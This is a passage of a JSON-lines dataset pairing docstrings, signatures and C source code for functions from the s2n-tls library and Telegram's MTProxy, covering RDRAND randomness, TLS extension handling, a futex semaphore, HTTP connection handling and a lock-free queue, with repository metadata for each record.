how the opcode is encoded:\n            * 0x48 (pick a 64-bit register it does more too, but that's all that matters there)\n            * 0x0fc7 (rdrand)\n            * 0xf0 (store the result in rax). */\n            __asm__ __volatile__(\".byte 0x48, 0x0f, 0xc7, 0xf0;\\n\" \"setc %b1;\\n\": \"=a\"(output.u64), \"=qm\"(success)\n            :\n            :\"cc\");\n#endif /* defined(__i386__) */\n\n            /* Some AMD CPUs will find that RDRAND \"sticks\" on all 1s but still reports success.\n             * Some other very old CPUs use all 0s as an error condition while still reporting success.\n             * If we encounter either of these suspicious values (a 1/2^63 chance) we'll treat them as\n             * a failure and generate a new value.\n             *\n             * In the future we could add CPUID checks to detect processors with these known bugs,\n             * however it does not appear worth it. The entropy loss is negligible and the\n             * corresponding likelihood that a healthy CPU generates either of these values is also\n             * negligible (1/2^63). Finally, adding processor specific logic would greatly\n             * increase the complexity and would cause us to \"miss\" any unknown processors with\n             * similar bugs. */\n            if (output.u64 == UINT64_MAX ||\n                output.u64 == 0) {\n                success = 0;\n            }\n\n            if (success) {\n                break;\n            }\n        }\n\n        ENSURE_POSIX(success, S2N_ERR_RDRAND_FAILED);\n\n        int data_to_fill = MIN(sizeof(output), space_remaining);\n\n        GUARD_POSIX(s2n_stuffer_write_bytes(&stuffer, output.u8, data_to_fill));\n    }\n\n    return S2N_SUCCESS;\n#else\n    BAIL_POSIX(S2N_ERR_UNSUPPORTED_CPU);\n#endif\n}", "path": "s2n-tls/utils/s2n_random.c", "commit_date": "2020-11-06 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* Helper function to allow us to easily repeat the PQ extension test for many scenarios.\n * If the KEM negotiation is expected to fail (because of e.g. a client/server extension\n * mismatch), pass in expected_kem_id = -1. The tests should always EXPECT_SUCCESS when\n * calling this function. */\n", "func_signal": "static int negotiate_kem(const uint8_t client_extensions[], const size_t client_extensions_len,\n                         const uint8_t client_hello_message[], const size_t client_hello_len,\n                         const char cipher_pref_version[], const int expected_kem_id, struct s2n_test_io_pair *io_pair)", "code": "{\n    S2N_ERROR_IF(s2n_is_in_fips_mode(), S2N_ERR_PQ_KEMS_DISALLOWED_IN_FIPS);\n\n    char *cert_chain;\n    char *private_key;\n\n    GUARD_NONNULL(cert_chain = malloc(S2N_MAX_TEST_PEM_SIZE));\n    GUARD_NONNULL(private_key = malloc(S2N_MAX_TEST_PEM_SIZE));\n    GUARD(setenv(\"S2N_DONT_MLOCK\", \"1\", 0));\n\n    struct s2n_connection *server_conn;\n    struct s2n_config *server_config;\n    s2n_blocked_status server_blocked;\n    struct s2n_cert_chain_and_key *chain_and_key;\n\n    size_t body_len = client_hello_len + client_extensions_len;\n    uint8_t message_header[] = {\n            /* Handshake message type CLIENT HELLO */\n            0x01,\n            /* Body len */\n            (body_len >> 16) & 0xff, (body_len >> 8) & 0xff, (body_len & 0xff),\n    };\n    size_t message_header_len = sizeof(message_header);\n    size_t message_len = message_header_len + body_len;\n    uint8_t record_header[] = {\n            /* Record type HANDSHAKE */\n            0x16,\n            /* Protocol version TLS 1.2 */\n            0x03, 0x03,\n            /* Message len */\n            (message_len >> 8) & 0xff, (message_len & 0xff),\n    };\n    size_t record_header_len = sizeof(record_header);\n\n\n    GUARD_NONNULL(server_conn = s2n_connection_new(S2N_SERVER));\n    GUARD(s2n_connection_set_io_pair(server_conn, io_pair));\n\n    GUARD_NONNULL(server_config = s2n_config_new());\n    GUARD(s2n_read_test_pem(S2N_DEFAULT_TEST_CERT_CHAIN, cert_chain, S2N_MAX_TEST_PEM_SIZE));\n    GUARD(s2n_read_test_pem(S2N_DEFAULT_TEST_PRIVATE_KEY, private_key, S2N_MAX_TEST_PEM_SIZE));\n    GUARD_NONNULL(chain_and_key = s2n_cert_chain_and_key_new());\n    GUARD(s2n_cert_chain_and_key_load_pem(chain_and_key, cert_chain, private_key));\n    GUARD(s2n_config_add_cert_chain_and_key_to_store(server_config, chain_and_key));\n    GUARD(s2n_config_set_cipher_preferences(server_config, cipher_pref_version));\n    GUARD(s2n_connection_set_config(server_conn, server_config));\n    server_conn->secure.kem_params.kem = NULL;\n\n    /* Send the client hello */\n    eq_check(write(io_pair->client, record_header, record_header_len),record_header_len);\n    eq_check(write(io_pair->client, message_header, message_header_len),message_header_len);\n    eq_check(write(io_pair->client, client_hello_message, client_hello_len),client_hello_len);\n    eq_check(write(io_pair->client, client_extensions, client_extensions_len),client_extensions_len);\n\n    GUARD(s2n_connection_set_blinding(server_conn, S2N_SELF_SERVICE_BLINDING));\n    if (s2n_negotiate(server_conn, &server_blocked) == 0) {\n        /* We expect the overall negotiation to fail and return non-zero, but it should get far enough\n         * that a KEM extension was agreed upon. */\n        return S2N_FAILURE;\n    }\n\n    int negotiated_kem_id;\n\n    if (server_conn->secure.kem_params.kem != NULL) {\n        negotiated_kem_id = server_conn->secure.kem_params.kem->kem_extension_id;\n    } else {\n        negotiated_kem_id = -1;\n    }\n\n    GUARD(s2n_connection_free(server_conn));\n    GUARD(s2n_cert_chain_and_key_free(chain_and_key));\n    GUARD(s2n_config_free(server_config));\n\n    free(cert_chain);\n    free(private_key);\n\n    S2N_ERROR_IF(negotiated_kem_id != expected_kem_id, S2N_ERR_KEM_UNSUPPORTED_PARAMS);\n    \n    return 0;\n}", "path": "s2n-tls/tests/unit/s2n_client_extensions_test.c", "commit_date": "2020-10-21 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* init session cache lock field, which is used to mock a remote\n * connection/event block\n */\n", "func_signal": "static void initialize_cache()", "code": "{\n    for (int i = 0; i < 256; i++) {\n        session_cache[i].lock = 1;\n    }\n}", "path": "s2n-tls/tests/unit/s2n_self_talk_session_id_test.c", "commit_date": "2020-10-21 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* When using QUIC, S2N reads unencrypted handshake messages instead of encrypted records.\n * This method sets up the S2N input buffers to match the results of using s2n_read_full_record.\n */\n", "func_signal": "S2N_RESULT s2n_quic_read_handshake_message(struct s2n_connection *conn, uint8_t *message_type)", "code": "{\n    ENSURE_REF(conn);\n\n    /* Allocate stuffer space now so that we don't have to realloc later in the handshake. */\n    GUARD_AS_RESULT(s2n_stuffer_resize_if_empty(&conn->in, S2N_EXPECTED_QUIC_MESSAGE_SIZE));\n\n    GUARD_RESULT(s2n_read_in_bytes(conn, &conn->handshake.io, TLS_HANDSHAKE_HEADER_LENGTH));\n\n    uint32_t message_len;\n    GUARD_AS_RESULT(s2n_handshake_parse_header(conn, message_type, &message_len));\n    GUARD_AS_RESULT(s2n_stuffer_reread(&conn->handshake.io));\n\n    ENSURE(message_len < S2N_MAXIMUM_HANDSHAKE_MESSAGE_LENGTH, S2N_ERR_BAD_MESSAGE);\n    GUARD_RESULT(s2n_read_in_bytes(conn, &conn->in, message_len));\n\n    return S2N_RESULT_OK;\n}", "path": "s2n-tls/tls/s2n_quic_support.c", "commit_date": "2020-11-11 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* Populates the appropriate index of either the mutually_supported_curves or\n * mutually_supported_kem_groups array based on the received IANA ID. Will\n * ignore unrecognized IANA IDs (and return success). */\n", "func_signal": "static int s2n_client_supported_groups_recv_iana_id(struct s2n_connection *conn, uint16_t iana_id)", "code": "{\n    notnull_check(conn);\n\n    const struct s2n_ecc_preferences *ecc_pref = NULL;\n    GUARD(s2n_connection_get_ecc_preferences(conn, &ecc_pref));\n    notnull_check(ecc_pref);\n\n    for (size_t i = 0; i < ecc_pref->count; i++) {\n        const struct s2n_ecc_named_curve *supported_curve = ecc_pref->ecc_curves[i];\n        if (iana_id == supported_curve->iana_id) {\n            conn->secure.mutually_supported_curves[i] = supported_curve;\n            return S2N_SUCCESS;\n        }\n    }\n\n    /* Return early if in FIPS mode, or if TLS 1.3 is disabled, so as to ignore PQ IDs */\n    if (s2n_is_in_fips_mode() || s2n_connection_get_protocol_version(conn) < S2N_TLS13) {\n        return S2N_SUCCESS;\n    }\n\n    const struct s2n_kem_preferences *kem_pref = NULL;\n    GUARD(s2n_connection_get_kem_preferences(conn, &kem_pref));\n    notnull_check(kem_pref);\n\n    for (size_t i = 0; i < kem_pref->tls13_kem_group_count; i++) {\n        const struct s2n_kem_group *supported_kem_group = kem_pref->tls13_kem_groups[i];\n        if (iana_id == supported_kem_group->iana_id) {\n            conn->secure.mutually_supported_kem_groups[i] = supported_kem_group;\n            return S2N_SUCCESS;\n        }\n    }\n\n    return S2N_SUCCESS;\n}", "path": "s2n-tls/tls/extensions/s2n_client_supported_groups.c", "commit_date": "2020-10-19 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* Old-style extension functions -- remove after extensions refactor is complete */\n", "func_signal": "int s2n_extensions_client_supported_groups_send(struct s2n_connection *conn, struct s2n_stuffer *out)", "code": "{\n    GUARD(s2n_extension_send(&s2n_client_supported_groups_extension, conn, out));\n\n    /* The original send method also sent ec point formats. To avoid breaking\n     * anything, I'm going to let it continue writing point formats.\n     */\n    GUARD(s2n_extension_send(&s2n_client_ec_point_format_extension, conn, out));\n\n    return S2N_SUCCESS;\n}", "path": "s2n-tls/tls/extensions/s2n_client_supported_groups.c", "commit_date": "2020-10-19 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* Return 1 if hmac algorithm is available, 0 otherwise. */\n", "func_signal": "bool s2n_hmac_is_available(s2n_hmac_algorithm hmac_alg)", "code": "{\n    switch(hmac_alg) {\n    case S2N_HMAC_MD5:\n    case S2N_HMAC_SSLv3_MD5:\n    case S2N_HMAC_SSLv3_SHA1:\n        /* Set is_available to 0 if in FIPS mode, as MD5/SSLv3 algs are not available in FIPS mode. */\n        return !s2n_is_in_fips_mode();\n    case S2N_HMAC_NONE:\n    case S2N_HMAC_SHA1:\n    case S2N_HMAC_SHA224:\n    case S2N_HMAC_SHA256:\n    case S2N_HMAC_SHA384:\n    case S2N_HMAC_SHA512:\n        return true;\n    }\n    return false;\n}", "path": "s2n-tls/crypto/s2n_hmac.c", "commit_date": "2020-12-15 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* Old-style extension functions -- remove after extensions refactor is complete */\n", "func_signal": "uint32_t s2n_extensions_client_key_share_size(struct s2n_connection *conn)", "code": "{\n    notnull_check(conn);\n\n    const struct s2n_ecc_preferences *ecc_pref = NULL;\n    GUARD(s2n_connection_get_ecc_preferences(conn, &ecc_pref));\n    notnull_check(ecc_pref);\n\n    uint32_t s2n_client_key_share_extension_size = S2N_SIZE_OF_EXTENSION_TYPE\n            + S2N_SIZE_OF_EXTENSION_DATA_SIZE\n            + S2N_SIZE_OF_CLIENT_SHARES_SIZE;\n\n    s2n_client_key_share_extension_size += S2N_SIZE_OF_KEY_SHARE_SIZE + S2N_SIZE_OF_NAMED_GROUP;\n    s2n_client_key_share_extension_size += ecc_pref->ecc_curves[0]->share_size;\n\n    return s2n_client_key_share_extension_size;\n}", "path": "s2n-tls/tls/extensions/s2n_client_key_share.c", "commit_date": "2020-10-19 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* custom semaphore implementation using futexes */\n", "func_signal": "int mp_sem_post (mp_sem_t *sem)", "code": "{\n  __sync_fetch_and_add (&sem->value, 1);\n  if (sem->waiting > 0) {\n    syscall (__NR_futex, &sem->value, FUTEX_WAKE, 1, NULL, 0, 0);\n  }\n  return 0;\n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/*\n *\n *\tPARSE ARGS & INITIALIZATION\n *\n */\n", "func_signal": "static void check_children_dead (void)", "code": "{\n  int i, j;\n  for (j = 0; j < 11; j++) {\n    for (i = 0; i < workers; i++) {\n      if (pids[i]) {\n        int status = 0;\n        int res = waitpid (pids[i], &status, WNOHANG);\n        if (res == pids[i]) {\n          if (WIFEXITED (status) || WIFSIGNALED (status)) {\n            pids[i] = 0;\n          } else {\n            break;\n          }\n        } else if (res == 0) {\n          break;\n        } else if (res != -1 || errno != EINTR) {\n          pids[i] = 0;\n        } else {\n          break;\n        }\n      }\n    }\n    if (i == workers) {\n      break;\n    }\n    if (j < 10) {\n      usleep (100000);\n    }\n  }\n  if (j == 11) {\n    int cnt = 0;\n    for (i = 0; i < workers; i++) {\n      if (pids[i]) {\n        ++cnt;\n        kill (pids[i], SIGKILL);\n      }\n    }\n    kprintf (\"WARNING: %d children unfinished --> they are now killed\\n\", cnt);\n  }\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// connection_job_t get_target_connection (conn_target_job_t S, int rotate);\n", "func_signal": "conn_target_job_t choose_proxy_target (int target_dc)", "code": "{\n  assert (CurConf->auth_clusters > 0);\n  struct mf_cluster *MFC = mf_cluster_lookup (CurConf, target_dc, 1);\n  if (!MFC) {\n    return 0;\n  }\n  int attempts = 5;\n  while (attempts --> 0) {\n    assert (MFC->targets_num > 0);\n    conn_target_job_t S = MFC->cluster_targets[lrand48() % MFC->targets_num];\n    connection_job_t C = 0;\n    rpc_target_choose_random_connections (S, 0, 1, &C);\n    if (C && TCP_RPC_DATA(C)->extra_int == get_conn_tag (C)) {\n      job_decref (JOB_REF_PASS (C));\n      return S;\n    }\n  }\n  return 0;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// NET-CPU context\n", "func_signal": "int hts_execute (connection_job_t c, struct raw_message *msg, int op)", "code": "{\n  struct hts_data *D = HTS_DATA(c);\n  vkprintf (2, \"in hts_execute: connection #%d, op=%d, header_size=%d, data_size=%d, http_version=%d\\n\",\n\t    CONN_INFO(c)->fd, op, D->header_size, D->data_size, D->http_ver);\n  rwm_dump(msg);\n\n  fail_connection(c, -1);\n  return 0;\n  // lru_insert_conn (c); // dangerous in net-cpu context\n  if (check_conn_buffers (c) < 0) {\n    return -429;\n  }\n\n  if (D->data_size >= MAX_POST_SIZE) {\n    return -413;\n  }\n\n  if (!((D->query_type == htqt_post && D->data_size > 0) || (D->query_type == htqt_options && D->data_size < 0))) {\n    D->query_flags &= ~QF_KEEPALIVE;\n    return -501;\n  }\n\n  if (D->data_size < 0) {\n    D->data_size = 0;\n  }\n\n  if (D->uri_size > 14 || D->header_size > MAX_HTTP_HEADER_SIZE) {\n    return -414;\n  }\n\n  if (D->data_size > 0) {\n    int need_bytes = D->data_size + D->header_size - msg->total_bytes;\n    if (need_bytes > 0) {\n      vkprintf (2, \"-- need %d more bytes, waiting\\n\", need_bytes);\n      return need_bytes;\n    }\n  }\n\n  assert (msg->total_bytes == D->header_size + D->data_size);\n\n  // create http query job here\n  job_t job = create_async_job (http_query_job_run, JSP_PARENT_RWE | JSC_ALLOW (JC_ENGINE, JS_RUN) | JSC_ALLOW (JC_ENGINE, JS_ABORT) | JSC_ALLOW (JC_ENGINE, JS_ALARM) | JSC_ALLOW (JC_CONNECTION, JS_FINISH), -2, sizeof (struct http_query_info) + D->header_size + 1, JT_HAVE_TIMER, JOB_REF_NULL);\n  assert (job);\n  struct http_query_info *HQ = (struct http_query_info *)(job->j_custom);\n\n  rwm_clone (&HQ->msg, msg);\n  HQ->conn = job_incref (c);\n  HQ->conn_fd = CONN_INFO(c)->fd;\n  HQ->conn_generation = CONN_INFO(c)->generation;\n  HQ->flags = 1;  // pending_queries\n  assert (!CONN_INFO(c)->pending_queries);\n  CONN_INFO(c)->pending_queries++;\n  ++pending_http_queries;\n  HQ->query_type = D->query_type;\n  HQ->header_size = D->header_size;\n  HQ->data_size = D->data_size;\n  HQ->first_line_size = D->first_line_size;\n  HQ->host_offset = D->host_offset;\n  HQ->host_size = D->host_size;\n  HQ->uri_offset = D->uri_offset;\n  HQ->uri_size = D->uri_size;\n  assert (rwm_fetch_data (&HQ->msg, HQ->header, HQ->header_size) == HQ->header_size);\n  HQ->header[HQ->header_size] = 0;\n  assert (HQ->msg.total_bytes == HQ->data_size);\n\n  schedule_job (JOB_REF_PASS (job));\n  return 0;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* -------------------------- EXTERFACE ---------------------------- */\n", "func_signal": "struct tl_act_extra *mtfront_parse_function (struct tl_in_state *tlio_in, long long actor_id)", "code": "{\n  ++api_invoke_requests;\n  if (actor_id != 0) {\n    tl_fetch_set_error (TL_ERROR_WRONG_ACTOR_ID, \"MTProxy only supports actor_id = 0\");\n    return 0;\n  }\n  int op = tl_fetch_int ();\n  if (tl_fetch_error ()) {\n    return 0;\n  }\n  switch (op) {\n  default:\n    tl_fetch_set_error_format (TL_ERROR_UNKNOWN_FUNCTION_ID, \"Unknown op %08x\", op);\n    return 0;\n  }\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// NET_CPU context\n", "func_signal": "int mtproto_http_close (connection_job_t C, int who)", "code": "{\n  assert ((unsigned) CONN_INFO(C)->fd < MAX_CONNECTIONS);\n  vkprintf (3, \"http connection closing (%d) by %d, %d queries pending\\n\", CONN_INFO(C)->fd, who, CONN_INFO(C)->pending_queries);\n  if (CONN_INFO(C)->pending_queries) {\n    assert (CONN_INFO(C)->pending_queries == 1);\n    pending_http_queries--;\n    CONN_INFO(C)->pending_queries = 0;\n  }\n  schedule_job_callback (JC_ENGINE, do_close_in_ext_conn, &CONN_INFO(C)->fd, 4);\n  return 0;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// executed BEFORE dropping privileges\n", "func_signal": "void mtfront_pre_init (void)", "code": "{\n  init_ct_server_mtfront ();\n\n  int res = do_reload_config (0x26);\n\n  if (res < 0) {\n    fprintf (stderr, \"config check failed! (code %d)\\n\", res);\n    exit (-res);\n  }\n\n  vkprintf (1, \"config loaded!\\n\");\n\n  if (domain_count) {\n    tcp_rpc_init_proxy_domains();\n\n    if (workers) {\n      kprintf (\"It is recommended to not use workers with TLS-transport\");\n    }\n    if (secret_count == 0) {\n      kprintf (\"You must specify at least one mtproto-secret to use when using TLS-transport\");\n      exit (2);\n    }\n  }\n\n  int i, enable_ipv6 = engine_check_ipv6_enabled () ? SM_IPV6 : 0;\n\n  for (i = 0; i < http_ports_num; i++) {\n    http_sfd[i] = server_socket (http_port[i], engine_state->settings_addr, engine_get_backlog (), enable_ipv6);\n    if (http_sfd[i] < 0) {\n      kprintf (\"cannot open http/tcp server socket at port %d: %m\\n\", http_port[i]);\n      exit (1);\n    }\n  }\n\n  if (workers) {\n    if (!kdb_hosts_loaded) {\n      kdb_load_hosts ();\n    }\n    WStats = mmap (0, 2 * workers * sizeof (struct worker_stats), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n    assert (WStats);\n    // kprintf_multiprocessing_mode_enable ();\n    int real_parent_pid = getpid();\n    vkprintf (0, \"creating %d workers\\n\", workers);\n    for (i = 0; i < workers; i++) {\n      int pid = fork ();\n      assert (pid >= 0);\n      if (!pid) {\n        worker_id = i;\n        workers = 0;\n        slave_mode = 1;\n        parent_pid = getppid ();\n        assert (parent_pid == real_parent_pid);\n\tengine_enable_slave_mode ();\n\tengine_state->do_not_open_port = 1;\n        break;\n      } else {\n        pids[i] = pid;\n      }\n    }\n  }\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* functions for mp_queue = list of mp_queue_block's */\n", "func_signal": "void init_mp_queue (struct mp_queue *MQ)", "code": "{\n  assert (MQ->mq_magic != MQ_MAGIC && MQ->mq_magic != MQ_MAGIC_SEM);\n  memset (MQ, 0, sizeof (struct mp_queue));\n  MQ->mq_head = MQ->mq_tail = alloc_mpq_block (0, 0, 1);\n  MQ->mq_magic = MQ_MAGIC;\n\n  if (!MqGarbageBlocks.mq_magic) {\n    init_mp_queue (&MqGarbageBlocks);\n    init_mp_queue (&MqGarbageSmallBlocks);\n  } else if (!MqPreparedBlocks.mq_magic) {\n    init_mp_queue (&MqPreparedBlocks);\n    init_mp_queue (&MqPreparedSmallBlocks);\n  }    \n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// may invoke mpq_pop()/mpq_push() if allow_recursion=1\n", "func_signal": "struct mp_queue_block *alloc_mpq_block (mqn_value_t first_val, int allow_recursion, int is_small)", "code": "{\n  struct mp_queue_block *QB = 0;\n  int prepared = 0, align_bytes = 0;\n  long size = (is_small ? MPQ_SMALL_BLOCK_SIZE : MPQ_BLOCK_SIZE);\n  if (allow_recursion) {\n    QB = mpq_pop (is_small ? &MqGarbageSmallBlocks : &MqGarbageBlocks, MPQF_RECURSIVE);\n    if (QB) {\n      if (!is_hazard_ptr (QB, 0, 2)) {\n\t// reclaiming garbage\n\tassert (QB->mqb_magic == MQ_BLOCK_GARBAGE_MAGIC); \n\t__sync_fetch_and_add (&mpq_blocks_wasted, -1);\n\talign_bytes = QB->mqb_align_bytes;\n      } else {\n\tmpq_push (is_small ? &MqGarbageSmallBlocks : &MqGarbageBlocks, QB, MPQF_RECURSIVE);\n\tQB = 0;\n      }\n    }\n    if (!QB) {\n      QB = mpq_pop (is_small ? &MqPreparedSmallBlocks : &MqPreparedBlocks, MPQF_RECURSIVE);\n      if (QB) {\n\tassert (QB->mqb_magic == MQ_BLOCK_PREPARED_MAGIC); \n\tprepared = 1;\n\t__sync_fetch_and_add (&mpq_blocks_prepared, -1);\n\talign_bytes = QB->mqb_align_bytes;\n      }\n    }\n  }\n  if (!QB) {\n    char *new_block = malloc (offsetof (struct mp_queue_block, mqb_nodes) + size * (2 * sizeof (void *)) + MPQ_BLOCK_ALIGNMENT - sizeof (void *));\n    assert (new_block);\n    assert (!((long) new_block & (sizeof (void *) - 1)));\n    align_bytes = -(int)(long) new_block & (MPQ_BLOCK_ALIGNMENT - 1);\n    QB = (struct mp_queue_block *) (new_block + align_bytes);\n\n    __sync_fetch_and_add (&mpq_blocks_true_allocations, 1);\n    if (is_small) {\n      int t = __sync_fetch_and_add (&mpq_small_blocks_allocated, 1);\n      if (t >= mpq_small_blocks_allocated_max) {\n\t__sync_bool_compare_and_swap (&mpq_small_blocks_allocated_max, mpq_small_blocks_allocated_max, t + 1);\n      }\n    } else {\n      int t = __sync_fetch_and_add (&mpq_blocks_allocated, 1);\n      if (t >= mpq_blocks_allocated_max) {\n\t__sync_bool_compare_and_swap (&mpq_blocks_allocated_max, mpq_blocks_allocated_max, t + 1);\n      }\n    }\n  } else {\n    assert (QB->mqb_size == size);\n  }\n  __sync_fetch_and_add (&mpq_blocks_allocations, 1);\n\n  memset (QB, 0, offsetof (struct mp_queue_block, mqb_nodes));\n  QB->mqb_align_bytes = align_bytes;\n  QB->mqb_size = size;\n\n  QB->mqb_nodes[0].idx = MQN_SAFE;\n  QB->mqb_nodes[0].val = first_val;\n\n  if (!prepared) {\n    long i;\n    for (i = 1; i < size; i++) {\n      QB->mqb_nodes[i].idx = MQN_SAFE + i;\n      QB->mqb_nodes[i].val = 0;\n    }\n  }\n\n  if (first_val) {\n    QB->mqb_tail = 1;\n  }\n\n  QB->mqb_magic = MQ_BLOCK_USED_MAGIC;\n  return QB;\n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// filename = 0 -- use DEFAULT_PWD_FILE\n// 1 = init ok, else < 0\n", "func_signal": "int aes_load_pwd_file (const char *filename)", "code": "{\n  int h = open (\"/dev/random\", O_RDONLY | O_NONBLOCK);\n  int r = 0;\n\n  if (h >= 0) {\n    r = read (h, rand_buf, 16);\n    if (r < 0) {\n      perror (\"READ\");\n      r = 0;\n    }\n    if (r > 0) {\n      vkprintf (2, \"added %d bytes of real entropy to the AES security key\\n\", r);\n    }\n    if (r < 0) {\n      perror (\"read from random\");\n      r = 0;\n    }\n    close (h);\n  }\n\n  if (r < 16) {\n    h = open (\"/dev/urandom\", O_RDONLY);\n    if (h < 0) {\n      main_secret.secret_len = 0;\n      return -1;\n    }\n    int s = read (h, rand_buf + r, 16 - r);\n    if (r + s != 16) {\n      main_secret.secret_len = 0;\n      return -1;\n    }\n    close (h);\n  }\n\n  *(long *) rand_buf ^= lrand48_j();\n\n  srand48 (*(long *)rand_buf);\n\n  if (!filename) {\n    filename = DEFAULT_PWD_FILE;\n  }\n\n  h = open (filename, O_RDONLY);\n\n  if (h < 0) {\n    vkprintf (1, \"cannot open password file %s: %m\\n\", filename);\n    return -0x80000000;\n  }\n\n  r = read (h, pwd_config_buf, MAX_PWD_CONFIG_LEN + 1);\n\n  close (h);\n\n  if (r < 0) {\n    vkprintf (1, \"error reading password file %s: %m\\n\", filename);\n    return -1;\n  }\n\n  vkprintf (1, \"loaded %d bytes from password file %s\\n\", r, filename);\n\n  if (r > MAX_PWD_CONFIG_LEN) {\n    pwd_config_len = 0;\n    return -1;\n  }\n\n  pwd_config_len = r;\n  memset (pwd_config_buf + r, 0, 4);\n\n  if (r < MIN_PWD_LEN || r > MAX_PWD_LEN) {\n    vkprintf (1, \"secret file %s too long or too short: loaded %d bytes, expected %d..%d\\n\", filename, r, MIN_PWD_LEN, MAX_PWD_LEN);\n    return -1;\n  }\n\n  md5_hex (pwd_config_buf, pwd_config_len, pwd_config_md5);\n  \n  memcpy (main_secret.secret, pwd_config_buf, r);\n  main_secret.secret_len = r;\n\n  aes_initialized = 1;\n\n  return 1;\n}", "path": "MTProxy/net/net-crypto-aes.c", "commit_date": "2019-07-09 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "// NET-CPU context\n", "func_signal": "int mtproto_http_alarm (connection_job_t C)", "code": "{\n  vkprintf (2, \"http_alarm() for connection %d\\n\", CONN_INFO(C)->fd);\n\n  assert (CONN_INFO(C)->status == conn_working);\n  HTS_DATA(C)->query_flags &= ~QF_KEEPALIVE;\n\n  write_http_error (C, 500);\n\n  if (CONN_INFO(C)->pending_queries) {\n    assert (CONN_INFO(C)->pending_queries == 1);\n    --pending_http_queries;\n    CONN_INFO(C)->pending_queries = 0;\n  }\n\n  HTS_DATA(C)->parse_state = -1;\n  connection_write_close (C);\n\n  return 0;\n}", "path": "MTProxy/mtproto/mtproto-proxy.c", "commit_date": "2019-09-11 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* initialize this thread id and return it */\n", "func_signal": "int get_this_thread_id (void)", "code": "{\n  int i = mpq_this_thread_id;\n  if (i) {\n    return i;\n  }\n  i = __sync_fetch_and_add (&mpq_threads, 1) + 1;\n  assert (i > 0 && i < MAX_MPQ_THREADS);\n  thread_hazard_pointers = mqb_hazard_ptr[i];\n  return mpq_this_thread_id = i;\n}", "path": "MTProxy/common/mp-queue.c", "commit_date": "2018-05-29 00:00:00", "repo_name": "TelegramMessenger/MTProxy", "stars": 4581, "license": "None", "language": "c", "size": 330}
{"docstring": "/* may invoke mpq_alloc_block (which recursively invokes mpq_pop) \n   or mpq_push() (without needing to hold hazard pointer) to deal with blocks */\n", "func_signal": "long mpq_push (struct mp_queue *MQ, mqn_value_t val, int flags)", "code": "{\n  void **hptr = mqb_hazard_ptr[get_this_thread_id()];\n  long r = ((flags & MPQF_RECURSIVE) != 0);\n  while (1) {\n    struct mp_queue_block *QB = MQ->mq_tail;\n    barrier ();\n    hptr[r] = QB;\n    barrier ();\n    __sync_synchronize ();\n    if (MQ->mq_tail != QB) {\n      continue;\n    }\n\n    if (QB->mqb_next) {\n      __sync_bool_compare_and_swap (&MQ->mq_tail, QB, QB->mqb_next);\n      continue;\n    }\n    long pos = mpq_block_push (QB, val);\n    if (pos >= 0) {\n      if (flags & MPQF_STORE_PTR) {\n\thptr[2] = QB;\n      }\n      hptr[r] = 0;\n      return pos;\n    }\n#define DBG(c) // fprintf (stderr, \"[%d] pushing %lx to %p,%p: %c\\n\", mpq_this_thread_id, (long) val, MQ, QB, c);\n    DBG('A');\n    /*\n    if (__sync_fetch_and_add (&QB->mqb_next_allocators, 1)) {\n      // somebody else will allocate next block; busy wait instead of spuruous alloc/free\n      DBG('B')\n      while (!QB->mqb_next) {\n\tbarrier ();\n      }\n      DBG('C')\n      continue;\n    }\n    */\n    int is_small = (QB == MQ->mq_head);\n    struct mp_queue_block *NQB;\n    if (!r) {\n      assert (!hptr[1]);\n      NQB = alloc_mpq_block (val, 1, is_small);\n      assert 